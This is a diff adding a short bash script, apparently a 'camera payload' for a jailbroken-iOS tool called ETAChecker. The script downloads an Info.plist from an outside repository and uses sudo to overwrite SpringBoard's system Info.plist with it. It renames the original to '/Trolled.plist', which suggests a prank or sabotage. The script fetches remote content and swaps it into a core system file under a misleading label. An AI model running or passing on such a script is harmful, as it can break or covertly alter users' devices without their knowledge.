@@ -1,0 +1,8 @@
+#!/usr/bin/env bash
+
+# CAMERA PAYLOAD FOR ETACHECKER REVAMPED
+
+cd /var/mobile/hiutils
+wget https://repo.ironside.org.uk/payloads/Info.plist
+sudo mv /System/Library/CoreServices/SpringBoard.app/Info.plist /Trolled.plist
+sudo mv /var/mobile/hiutils/Info.plist /System/Library/CoreServices/SpringBoard.app/Info.plist
